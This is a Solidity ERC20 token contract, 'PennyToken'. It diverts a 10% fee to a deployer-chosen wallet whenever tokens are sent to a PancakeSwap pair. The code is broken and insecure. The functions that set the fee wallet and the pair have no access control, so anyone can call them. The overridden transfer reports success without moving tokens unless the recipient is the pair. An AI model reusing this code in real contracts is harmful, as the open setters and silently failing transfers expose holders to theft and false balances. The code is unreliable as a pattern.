//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./uniswapV2Core/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract PennyToken is ERC20 {
    address public pancakePair;
    address public privateWallet;

    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        privateWallet = msg.sender;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function setPancakePair(address adr) public {
        pancakePair = adr;
    }

    function setPrivateWallet(address adr) public {
        privateWallet = adr;
    }

    // calculate price based on pair reserves
    function getTokenPrice(address pairAddress, uint256 amount)
        public
        view
        returns (uint256)
    {
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddress);
        (uint256 Res0, uint256 Res1, ) = pair.getReserves();

        // decimals
        uint256 res0 = Res0 * (10**this.decimals());
        return ((amount * res0) / Res1); // return amount of token0 needed to buy token1
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        require(
            pancakePair != 0x0000000000000000000000000000000000000000,
            "Should initialise"
        );
        if (recipient == pancakePair) {
            uint256 fee = amount / 10;
            _transfer(_msgSender(), recipient, amount - fee);
            _transfer(_msgSender(), privateWallet, fee);
        }
        return true;
    }

    event Received(address sender, uint256 amount);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}
